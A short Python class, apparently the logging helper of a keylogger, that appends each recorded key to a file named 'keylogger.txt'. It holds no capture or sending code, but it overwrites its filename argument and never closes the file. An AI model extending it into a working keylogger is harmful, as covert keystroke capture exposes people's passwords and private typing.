
class createFile():

    def createKeyboardFile(self, filename):
        filename = "keylogger.txt"
        logfile = open(filename, "a")
        return logfile
    
    def writeInFile(self, key, filename):
        logfile = createFile().createKeyboardFile(filename)
        logfile.write(key)

